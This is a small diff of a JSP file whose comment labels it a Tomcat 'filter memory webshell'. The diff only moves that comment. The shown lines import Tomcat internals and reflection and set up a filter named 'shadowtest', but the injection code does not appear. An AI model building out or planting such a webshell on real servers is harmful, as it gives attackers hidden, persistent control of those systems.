@@ -1,4 +1,3 @@
-//filter内存马
 <%@ page import="org.apache.catalina.core.ApplicationContext" %>
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
@@ -12,6 +11,8 @@
 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
 
 <%
+     //filter内存马
+     
      final String name = "shadowtest";
      ServletContext servletContext = request.getSession().getServletContext();
 
